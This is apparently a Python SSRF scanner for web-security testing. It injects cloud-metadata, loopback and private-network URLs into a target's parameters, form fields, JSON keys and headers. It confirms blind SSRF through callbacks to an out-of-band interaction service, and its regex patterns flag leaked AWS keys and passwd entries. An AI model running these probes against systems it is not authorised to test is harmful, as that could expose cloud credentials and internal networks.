"""
SSRF scanner with in-band and OOB detection.

This version is intentionally stricter than the earlier implementation:
it only reports SSRF when the injected target produces a meaningful,
target-controlled signal, or when an OOB callback is confirmed.
"""
from __future__ import annotations

import re
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests


SSRF_TARGETS: List[Tuple[str, str]] = [
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/", "aws_iam"),
    ("http://169.254.169.254/latest/user-data/", "aws_userdata"),
    ("http://169.254.169.254/computeMetadata/v1/", "gcp_metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_internal"),
    ("http://169.254.169.254/metadata/instance", "azure_metadata"),
    ("http://127.0.0.1/", "localhost"),
    ("http://localhost/", "localhost_name"),
    ("http://0.0.0.0/", "zero_addr"),
    ("http://[::1]/", "ipv6_loopback"),
    ("http://[::ffff:127.0.0.1]/", "ipv6_mapped"),
    ("http://2130706433/", "decimal_ip"),
    ("http://0177.0.0.1/", "octal_ip"),
    ("http://%31%32%37%2e%30%2e%30%2e%31/", "urlenc_ip"),
    ("http://192.168.0.1/", "lan_gateway"),
    ("http://10.0.0.1/", "rfc1918_10"),
    ("http://172.16.0.1/", "rfc1918_172"),
]

SSRF_INDICATORS: List[str] = [
    r'"instanceId"\s*:',
    r'"privateIp"\s*:',
    r'"hostname"\s*:\s*"[^"]+',
    r'ami-[a-z0-9]{8,}',
    r'local-ipv4',
    r'instance-id',
    r'computeMetadata',
    r'metadata\.google\.internal',
    r'<title>[^<]*(Apache|nginx|IIS)[^<]*</title>',
    r'root:.*?:/bin/',
    r'"accessKeyId"\s*:',
    r'"secretAccessKey"\s*:',
    r'"Token"\s*:',
    r'iam/security-credentials',
    r'EC2_REGION',
    r'AZ_CLIENT_ID',
]

URL_PARAM_NAMES: List[str] = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "path", "redirect", "endpoint", "target", "fetch", "load",
    "file", "image", "img", "document", "resource", "proxy",
    "callback", "webhook", "webhook_url", "next", "return", "goto",
    "open", "data", "ref", "site", "html", "val", "validate",
    "domain", "host", "port", "to", "out", "view", "dir",
]

JSON_URL_KEYS: List[str] = [
    "url", "uri", "webhook", "webhook_url", "callback", "callback_url",
    "redirect_url", "success_url", "failure_url", "return_url",
    "target", "endpoint", "src", "source", "destination", "host",
    "image_url", "avatar_url", "icon_url", "logo_url", "resource",
]

SSRF_HEADERS: List[Tuple[str, str]] = [
    ("Referer", "{PAYLOAD}"),
    ("X-Forwarded-For", "{PAYLOAD}"),
    ("X-Forwarded-Host", "{PAYLOAD}"),
    ("X-Real-IP", "{PAYLOAD}"),
    ("Client-IP", "{PAYLOAD}"),
    ("True-Client-IP", "{PAYLOAD}"),
    ("X-Custom-IP-Authorization", "{PAYLOAD}"),
    ("X-Original-URL", "{PAYLOAD}"),
    ("X-Rewrite-URL", "{PAYLOAD}"),
]


class _OOBClient:
    REGISTER_URL = "https://oast.pro/register"
    POLL_URL = "https://oast.pro/poll"

    def __init__(self):
        self._available = False
        self._secret = None
        self._domain = None
        self._session = requests.Session()
        self._session.headers.update({"User-Agent": "vuln-scanner/1.0"})
        self._try_register()

    def _try_register(self):
        try:
            resp = self._session.post(
                self.REGISTER_URL,
                json={"public-key": "", "secret-key": ""},
                timeout=3,
            )
            data = resp.json()
            self._domain = data.get("domain")
            self._secret = data.get("secret-key")
            self._available = bool(self._domain)
            if self._available:
                print(f"[SSRF] interactsh registered - domain: {self._domain}")
            else:
                print("[SSRF] interactsh registration failed - blind SSRF disabled")
        except Exception as exc:
            print(f"[SSRF] interactsh unreachable: {exc} - blind SSRF disabled")

    @property
    def available(self) -> bool:
        return self._available

    def get_payload_url(self, tag: str = "", profile: str = "direct") -> str:
        if not self._available:
            return ""
        uid = uuid.uuid4().hex[:8]
        safe_tag = re.sub(r"[^a-z0-9-]", "-", str(tag or "probe").lower())[:16].strip("-") or "probe"
        safe_profile = re.sub(r"[^a-z0-9-]", "-", str(profile or "direct").lower())[:12].strip("-") or "direct"
        return f"http://{safe_profile}-{safe_tag}-{uid}.{self._domain}"

    def poll(self, seconds: int = 3) -> List[Dict]:
        if not self._available or not self._secret:
            return []
        time.sleep(seconds)
        try:
            resp = self._session.get(
                self.POLL_URL,
                params={"id": self._domain, "secret": self._secret},
                timeout=10,
            )
            data = resp.json()
            return data.get("data", []) or []
        except Exception as exc:
            print(f"[SSRF] Poll failed: {exc}")
            return []

    def close(self):
        pass


class SSRFScanner:
    def __init__(self, timeout: int = 10,
                 session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()
        if not session:
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

        self._oob = _OOBClient()
        self._oob_injections: Dict[str, Dict[str, str]] = {}
        self._network_map: Dict[str, Dict[str, Any]] = {}
        self.mapping_stats: Dict[str, Any] = {
            "tracked_injections": 0,
            "callbacks": 0,
            "profiles": {},
        }

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        ssrf_params = self._identify_ssrf_params(params)
        baseline_text, _ = self._fetch(url, params, "GET")

        for param in ssrf_params:
            print(f"  [SSRF] Testing param '{param}' on {url}")
            result = self._inband(url, param, params, "GET", baseline_text or "")
            if result:
                findings.append(result)
                continue
            if self._oob.available:
                self._inject_oob(url, param, params, "GET")

        result = self._header_injection(url)
        if result:
            findings.append(result)
        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        action = form_data.get("action", "")
        method = (form_data.get("method") or "GET").upper()
        inputs = form_data.get("inputs", [])

        if not action or not inputs:
            return findings

        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
        ssrf_params = self._identify_ssrf_params(baseline)
        baseline_text, _ = self._fetch(action, baseline, method)

        for param in ssrf_params:
            print(f"  [SSRF] Testing form param '{param}' on {action}")
            result = self._inband(action, param, baseline, method, baseline_text or "")
            if result:
                findings.append(result)
                continue
            if self._oob.available:
                self._inject_oob(action, param, baseline, method)

        result = self._json_body_ssrf(action, method)
        if result:
            findings.append(result)
        return findings

    def collect_oob_findings(self) -> List[Dict[str, Any]]:
        if not self._oob.available or not self._oob_injections:
            return []

        print(f"[SSRF] Polling interactsh for OOB callbacks ({len(self._oob_injections)} injections tracked)...")
        findings: List[Dict[str, Any]] = []
        interactions = self._oob.poll(seconds=8)

        for interaction in interactions:
            blob = str(interaction).lower()
            for oob_url, meta in self._oob_injections.items():
                token = meta.get("match_token", "")
                if token and token in blob:
                    print(
                        f"    [!] Blind SSRF confirmed: {meta['url']} "
                        f"param='{meta['param']}' protocol={interaction.get('protocol', 'unknown')}"
                    )
                    findings.append({
                        "vulnerable": True,
                        "type": "blind-ssrf",
                        "param": meta["param"],
                        "payload": oob_url,
                        "evidence": (
                            f"OOB callback received via {interaction.get('protocol', '?')} "
                            f"from {interaction.get('remote-address', '?')}"
                        ),
                        "confidence": 95,
                        "url": meta["url"],
                        "oob_url": oob_url,
                        "mapping_inference": meta.get("mapping_inference", ""),
                    })
                    self._record_network_map(oob_url, meta, interaction)
                    break

        self._oob.close()
        return findings

    def get_network_map(self) -> List[Dict[str, Any]]:
        return list(self._network_map.values())

    async def scan_url_async(self, url: str, params: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        ssrf_params = self._identify_ssrf_params(params)
        baseline_resp = await http.get(url, params=params)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for param in ssrf_params:
            result = await self._inband_async(url, param, params, "GET", http, baseline_text)
            if result:
                findings.append(result)
                continue
            if self._oob.available:
                await self._inject_oob_async(url, param, params, "GET", http)

        result = await self._header_injection_async(url, http)
        if result:
            findings.append(result)
        return findings

    async def scan_form_async(self, form: Dict[str, Any], http) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        action = form.get("action", "")
        method = (form.get("method") or "GET").upper()
        inputs = form.get("inputs", [])
        if not action or not inputs:
            return findings

        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
        ssrf_params = self._identify_ssrf_params(baseline)
        if method == "GET":
            baseline_resp = await http.get(action, params=baseline)
        else:
            baseline_resp = await http.post(action, data=baseline)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for param in ssrf_params:
            result = await self._inband_async(action, param, baseline, method, http, baseline_text)
            if result:
                findings.append(result)
                continue
            if self._oob.available:
                await self._inject_oob_async(action, param, baseline, method, http)

        result = await self._json_body_ssrf_async(action, method, http)
        if result:
            findings.append(result)
        return findings

    async def _inband_async(self, url, param, params, method, http, baseline_text: str):
        for payload_url, label in SSRF_TARGETS[:8]:
            data = {**params, param: payload_url}
            if method.upper() == "GET":
                resp = await http.get(url, params=data)
            else:
                resp = await http.post(url, data=data)
            if not resp:
                continue
            indicator = self._check_indicators(resp.text)
            if indicator and self._is_meaningful_inband_hit(baseline_text, resp.text, indicator, payload_url):
                return {
                    "vulnerable": True,
                    "type": "ssrf",
                    "param": param,
                    "payload": payload_url,
                    "evidence": f"Response contains: {indicator}",
                    "confidence": 92,
                    "url": url,
                    "target": label,
                }
        return None

    async def _inject_oob_async(self, url, param, params, method, http):
        oob_url = self._oob.get_payload_url(tag=param, profile="query")
        if not oob_url:
            return
        data = {**params, param: oob_url}
        started = time.time()
        if method.upper() == "GET":
            await http.get(url, params=data)
        else:
            await http.post(url, data=data)
        self._oob_injections[oob_url] = {
            "url": url,
            "param": param,
            "match_token": urlparse(oob_url).netloc.lower(),
            "profile": "query",
            "request_latency_ms": int((time.time() - started) * 1000),
            "mapping_inference": self._infer_mapping(param, "query", time.time() - started),
        }
        self.mapping_stats["tracked_injections"] += 1
        self.mapping_stats["profiles"]["query"] = self.mapping_stats["profiles"].get("query", 0) + 1

    async def _json_body_ssrf_async(self, url, method, http):
        if method.upper() not in ("POST", "PUT", "PATCH"):
            method = "POST"
        baseline_resp = await http.request(
            method, url, json={}, headers={"Content-Type": "application/json"}
        )
        baseline_text = baseline_resp.text if baseline_resp else ""

        for key in JSON_URL_KEYS[:5]:
            for payload_url, label in SSRF_TARGETS[:3]:
                resp = await http.request(
                    method, url,
                    json={key: payload_url},
                    headers={"Content-Type": "application/json"},
                )
                if resp:
                    indicator = self._check_indicators(resp.text)
                    if indicator and self._is_meaningful_inband_hit(baseline_text, resp.text, indicator, payload_url):
                        return {
                            "vulnerable": True,
                            "type": "ssrf",
                            "param": f"json:{key}",
                            "payload": payload_url,
                            "evidence": f"Response contains: {indicator}",
                            "confidence": 90,
                            "url": url,
                            "target": label,
                            "method": "json-body",
                        }
                if self._oob.available:
                    oob_url = self._oob.get_payload_url(tag=key, profile="json")
                    if oob_url:
                        started = time.time()
                        await http.request(
                            method, url,
                            json={key: oob_url},
                            headers={"Content-Type": "application/json"},
                        )
                        self._oob_injections[oob_url] = {
                            "url": url,
                            "param": f"json:{key}",
                            "match_token": urlparse(oob_url).netloc.lower(),
                            "profile": "json",
                            "request_latency_ms": int((time.time() - started) * 1000),
                            "mapping_inference": self._infer_mapping(f"json:{key}", "json", time.time() - started),
                        }
                        self.mapping_stats["tracked_injections"] += 1
                        self.mapping_stats["profiles"]["json"] = self.mapping_stats["profiles"].get("json", 0) + 1
        return None

    async def _header_injection_async(self, url, http):
        baseline_resp = await http.get(url)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for header_name, template in SSRF_HEADERS[:4]:
            for payload_url, label in SSRF_TARGETS[:3]:
                injected_value = template.replace("{PAYLOAD}", payload_url)
                resp = await http.get(url, headers={header_name: injected_value})
                if resp:
                    indicator = self._check_indicators(resp.text)
                    if indicator and self._is_meaningful_inband_hit(baseline_text, resp.text, indicator, payload_url):
                        return {
                            "vulnerable": True,
                            "type": "ssrf",
                            "param": f"header:{header_name}",
                            "payload": payload_url,
                            "evidence": f"Response contains: {indicator}",
                            "confidence": 88,
                            "url": url,
                            "target": label,
                            "method": "header-injection",
                        }
                if self._oob.available:
                    oob_url = self._oob.get_payload_url(tag=header_name, profile="header")
                    if oob_url:
                        started = time.time()
                        await http.get(url, headers={header_name: oob_url})
                        self._oob_injections[oob_url] = {
                            "url": url,
                            "param": f"header:{header_name}",
                            "match_token": urlparse(oob_url).netloc.lower(),
                            "profile": "header",
                            "request_latency_ms": int((time.time() - started) * 1000),
                            "mapping_inference": self._infer_mapping(f"header:{header_name}", "header", time.time() - started),
                        }
                        self.mapping_stats["tracked_injections"] += 1
                        self.mapping_stats["profiles"]["header"] = self.mapping_stats["profiles"].get("header", 0) + 1
        return None

    def _inband(self, url: str, param: str,
                params: Dict[str, Any], method: str,
                baseline_text: str) -> Optional[Dict]:
        for payload_url, label in SSRF_TARGETS[:8]:
            data = {**params, param: payload_url}
            text, _ = self._fetch(url, data, method)
            if text is None:
                continue

            indicator = self._check_indicators(text)
            if indicator and self._is_meaningful_inband_hit(baseline_text, text, indicator, payload_url):
                print(f"    [!] In-band SSRF on '{param}' ({label})")
                return {
                    "vulnerable": True,
                    "type": "ssrf",
                    "param": param,
                    "payload": payload_url,
                    "evidence": f"Response contains: {indicator}",
                    "confidence": 92,
                    "url": url,
                    "target": label,
                }
        return None

    def _inject_oob(self, url: str, param: str,
                    params: Dict[str, Any], method: str) -> None:
        oob_url = self._oob.get_payload_url(tag=param, profile="query")
        if not oob_url:
            return

        data = {**params, param: oob_url}
        started = time.time()
        self._fetch(url, data, method)
        self._oob_injections[oob_url] = {
            "url": url,
            "param": param,
            "match_token": urlparse(oob_url).netloc.lower(),
            "profile": "query",
            "request_latency_ms": int((time.time() - started) * 1000),
            "mapping_inference": self._infer_mapping(param, "query", time.time() - started),
        }
        self.mapping_stats["tracked_injections"] += 1
        self.mapping_stats["profiles"]["query"] = self.mapping_stats["profiles"].get("query", 0) + 1
        print(f"    [OOB] Injected interactsh URL into '{param}': {oob_url}")

    def _json_body_ssrf(self, url: str, method: str) -> Optional[Dict]:
        if method.upper() not in ("POST", "PUT", "PATCH"):
            method = "POST"

        try:
            baseline_resp = self.session.request(
                method, url,
                json={},
                timeout=self.timeout,
                headers={**dict(self.session.headers), "Content-Type": "application/json"},
            )
            baseline_text = baseline_resp.text or ""
        except requests.RequestException:
            baseline_text = ""

        for key in JSON_URL_KEYS[:5]:
            for payload_url, label in SSRF_TARGETS[:3]:
                try:
                    resp = self.session.request(
                        method, url,
                        json={key: payload_url},
                        timeout=self.timeout,
                        headers={**dict(self.session.headers), "Content-Type": "application/json"},
                    )
                    text = resp.text or ""
                    indicator = self._check_indicators(text)
                    if indicator and self._is_meaningful_inband_hit(baseline_text, text, indicator, payload_url):
                        print(f"    [!] JSON-body SSRF: key='{key}' payload={label}")
                        return {
                            "vulnerable": True,
                            "type": "ssrf",
                            "param": f"json:{key}",
                            "payload": payload_url,
                            "evidence": f"Response contains: {indicator}",
                            "confidence": 90,
                            "url": url,
                            "target": label,
                            "method": "json-body",
                        }

                    if self._oob.available:
                        oob_url = self._oob.get_payload_url(tag=key, profile="json")
                        if oob_url:
                            started = time.time()
                            self.session.request(
                                method, url,
                                json={key: oob_url},
                                timeout=self.timeout,
                                headers={**dict(self.session.headers), "Content-Type": "application/json"},
                            )
                            self._oob_injections[oob_url] = {
                                "url": url,
                                "param": f"json:{key}",
                                "match_token": urlparse(oob_url).netloc.lower(),
                                "profile": "json",
                                "request_latency_ms": int((time.time() - started) * 1000),
                                "mapping_inference": self._infer_mapping(f"json:{key}", "json", time.time() - started),
                            }
                            self.mapping_stats["tracked_injections"] += 1
                            self.mapping_stats["profiles"]["json"] = self.mapping_stats["profiles"].get("json", 0) + 1
                except requests.RequestException:
                    continue

        return None

    def _header_injection(self, url: str) -> Optional[Dict]:
        try:
            baseline_resp = self.session.get(url, timeout=self.timeout)
            baseline_text = baseline_resp.text or ""
        except requests.RequestException:
            baseline_text = ""

        for header_name, template in SSRF_HEADERS[:4]:
            for payload_url, label in SSRF_TARGETS[:3]:
                injected_value = template.replace("{PAYLOAD}", payload_url)
                try:
                    resp = self.session.get(
                        url,
                        timeout=self.timeout,
                        headers={**dict(self.session.headers), header_name: injected_value},
                    )
                    text = resp.text or ""
                    indicator = self._check_indicators(text)
                    if indicator and self._is_meaningful_inband_hit(baseline_text, text, indicator, payload_url):
                        print(f"    [!] Header SSRF via {header_name} ({label})")
                        return {
                            "vulnerable": True,
                            "type": "ssrf",
                            "param": f"header:{header_name}",
                            "payload": payload_url,
                            "evidence": f"Response contains: {indicator}",
                            "confidence": 88,
                            "url": url,
                            "target": label,
                            "method": "header-injection",
                        }

                    if self._oob.available:
                        oob_url = self._oob.get_payload_url(tag=header_name, profile="header")
                        if oob_url:
                            started = time.time()
                            self.session.get(
                                url,
                                timeout=self.timeout,
                                headers={**dict(self.session.headers), header_name: oob_url},
                            )
                            self._oob_injections[oob_url] = {
                                "url": url,
                                "param": f"header:{header_name}",
                                "match_token": urlparse(oob_url).netloc.lower(),
                                "profile": "header",
                                "request_latency_ms": int((time.time() - started) * 1000),
                                "mapping_inference": self._infer_mapping(f"header:{header_name}", "header", time.time() - started),
                            }
                            self.mapping_stats["tracked_injections"] += 1
                            self.mapping_stats["profiles"]["header"] = self.mapping_stats["profiles"].get("header", 0) + 1
                except requests.RequestException:
                    continue

        return None

    def _infer_mapping(self, param: str, profile: str, latency_seconds: float) -> str:
        hints: List[str] = [f"profile={profile}", f"param={param}"]
        if latency_seconds >= 4:
            hints.append("slow-fetch-path")
        elif latency_seconds >= 1.5:
            hints.append("deferred-backend-fetch")
        else:
            hints.append("fast-egress")
        if any(token in str(param).lower() for token in ("webhook", "callback", "url", "host")):
            hints.append("url-fetch-surface")
        return "inference: " + ", ".join(hints)

    def _record_network_map(self, oob_url: str, meta: Dict[str, Any], interaction: Dict[str, Any]) -> None:
        key = f"{meta.get('url')}::{meta.get('param')}"
        entry = self._network_map.setdefault(
            key,
            {
                "url": meta.get("url"),
                "param": meta.get("param"),
                "profiles": [],
                "protocols": [],
                "remote_addresses": [],
                "latencies_ms": [],
                "inferences": [],
                "callback_hosts": [],
            },
        )

        for field, value in (
            ("profiles", meta.get("profile", "query")),
            ("protocols", str(interaction.get("protocol", "unknown")).lower()),
            ("remote_addresses", str(interaction.get("remote-address", "?"))),
            ("inferences", meta.get("mapping_inference", "")),
            ("callback_hosts", urlparse(oob_url).netloc),
        ):
            if value and value not in entry[field]:
                entry[field].append(value)

        entry["latencies_ms"].append(meta.get("request_latency_ms", 0))
        entry["profiles"].sort()
        entry["protocols"].sort()
        entry["remote_addresses"].sort()
        entry["inferences"].sort()
        entry["callback_hosts"].sort()
        self.mapping_stats["callbacks"] += 1

    def _identify_ssrf_params(self, params: Dict[str, Any]) -> List[str]:
        found = []
        for name, value in params.items():
            name_lower = name.lower()
            if any(kw in name_lower for kw in URL_PARAM_NAMES):
                found.append(name)
                continue
            if value and isinstance(value, str):
                sv = value.strip()
                if sv.startswith(("http://", "https://", "//")):
                    found.append(name)
        return found

    def _fetch(self, url: str, params: Dict[str, Any], method: str) -> Tuple[Optional[str], int]:
        try:
            if method.upper() == "GET":
                r = self.session.get(url, params=params, timeout=self.timeout)
            else:
                r = self.session.post(url, data=params, timeout=self.timeout)
            return r.text, r.status_code
        except requests.RequestException as exc:
            print(f"    [err] {exc}")
            return None, 0

    def _check_indicators(self, text: str) -> Optional[str]:
        for pattern in SSRF_INDICATORS:
            if re.search(pattern, text, re.IGNORECASE):
                return pattern
        return None

    def _is_meaningful_inband_hit(
        self, baseline_text: str, candidate_text: str, indicator: str, payload_url: str
    ) -> bool:
        baseline_text = baseline_text or ""
        candidate_text = candidate_text or ""

        if candidate_text == baseline_text:
            return False

        if self._looks_like_fetch_error(candidate_text, payload_url):
            return False

        baseline_has_indicator = re.search(indicator, baseline_text, re.IGNORECASE) is not None
        if not baseline_has_indicator:
            return True

        return self._normalize_text(candidate_text) != self._normalize_text(baseline_text)

    def _normalize_text(self, text: str) -> str:
        text = re.sub(r"\b\d+\b", "#", text or "")
        text = re.sub(r"\s+", " ", text)
        return text[:4000].strip().lower()

    def _looks_like_fetch_error(self, text: str, payload_url: str) -> bool:
        lowered = (text or "").lower()
        error_markers = [
            "failed to establish a new connection",
            "max retries exceeded",
            "name or service not known",
            "temporary failure in name resolution",
            "connection refused",
            "connection timed out",
            "read timed out",
            "urlopen error",
            "newconnectionerror",
            "nodename nor servname provided",
        ]
        payload_host = urlparse(payload_url).netloc.lower()
        payload_path = urlparse(payload_url).path.lower()
        mentions_payload = payload_host in lowered or (payload_path and payload_path in lowered)
        return mentions_payload and any(marker in lowered for marker in error_markers)

    def _heuristic_match(self, text: str) -> bool:
        keywords = ["instance", "metadata", "internal", "localhost", "169.254", "iam", "credential"]
        t = text.lower()
        return sum(1 for kw in keywords if kw in t) >= 2
